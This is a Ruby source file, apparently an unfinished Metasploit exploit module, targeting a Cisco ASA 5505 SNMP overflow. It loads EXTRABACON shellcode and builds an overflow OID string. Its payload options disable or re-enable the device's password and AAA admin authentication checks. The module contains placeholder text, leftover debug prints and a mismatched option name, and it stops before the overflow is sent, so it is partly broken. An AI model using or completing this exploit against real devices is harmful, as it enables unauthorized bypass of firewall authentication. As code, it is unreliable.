require 'msf/core'
require 'snmp'

class MetasploitModule < Msf::Exploit::Remote


  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cisco ASA 5505 SNMP something something RCE.",
      'Description'    => %q{
        This module exploits stuff in a thing.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'NSA Tailored Access Operations',
        'William Webb <william_webb@rapid7.com>'   # MSF Module
      ],
      'References'     =>
      [
        [
          # Some refs might be cool
        ]
      ],
      'Platform'       => ['linux'],      # correct this at some point, somehow
      'Arch'           => ARCH_X86,
      'Targets'        =>
      [
        # Stuff and stuff
        [
          'Cisco ASA 5505',
          {
            'Version' => "asa804",
          },
        ]
      ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('RPORT', [true, "Destination port on target", 161]),
        OptString.new('RHOST', [true, "IP address of target ASA ", '']),
        OptString.new('Community', [true, "Community string", '']),
        OptEnum.new('PayloadOp', [true, 'The exploit operation',[ 'pass-disable',
                                                                  'pass-enable',], 
                                                                  'pass-disable']),
      ], self.class)

  end

  def hex(buf)
    return Rex::Text.to_hex_dump(buf)
  end

  # is there a better way to do this?

  def setup
    sc_file = File.join(Msf::Config.data_directory, "exploits", "EXTRABACON", "versions", "shellcode_" + target['Version'] + ".rb")
  
    begin
      load sc_file
    rescue LoadError    # shouldn't get here unless we enter something completely stupid
      print_error("Unable to load shellcode file! (#{sc_file})")
      print_error("Make sure the selected target is valid")
      exit
    end
  end

  def append_shellcode(p="")
    puts "Got here"
    if datastore['PayloadType'] == "pass-disable"
      puts "A?"
      p << $payload_PMCHECK_DISABLE_byte
      p << $payload_AAAADMINAUTH_DISABLE_byte
      puts "A!"
    elsif datastore['PayloadType'] == "pass-enable"
      puts "B?"
      p << $payload_PMCHECK_ENABLE_byte
      p << $payload_AAAADMINAUTH_ENABLE_byte
      puts "B!"
    else  
      return "unsupported"
    end
    puts "C!"
    p << $retn
    puts "D!"
    print_status("Appended shellcode for '#{datastore['PayloadOp']}' operation")
    return p
  end

  def exploit
    target_asa  = datastore['RHOST']
    target_port = datastore['RPORT']
    comm        = datastore['Community']
    
    head = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
    head_len = head.split('.').length

    wrapper = [$preamble_snmp, $successmsg_snmp, $launcher_snmp, $postscript_snmp].join('.')
    wrapper_len = wrapper.split('.').length
    wrapper += ".144" * (82 - wrapper_len)
    wrapper_len = wrapper.split('.').length

    overflow = [head, "95", wrapper, $my_ret_addr_snmp, $finder_snmp].join('.')
    # not needed unless we want to check payload generation errors
    overflow_len = head_len + 1 + wrapper_len + $my_ret_addr_len + $finder_len
    
    print_status("overflow is currently:\n")
    print hex(overflow)
    print_status("Appending shellcode ...")

    r = append_shellcode(overflow)
    print_status("overflow is now:\n")
    print hex(r)

    request_id = Random.rand(0x80000..0x1fffffff)
    print_status("Random SNMP request-id: #{request_id}")
    
    manager = SNMP::Manager.new(:Host => target_asa, :Port => target_port, :Community => comm)
    
    # first request
    response = manager.get(["sysDescr.0", "sysUpTime.0", "sysName.0"])
    response.each_varbind { |vb| puts vb.to_s}

    # second request
    # first varbind is sysDescr


  end

end
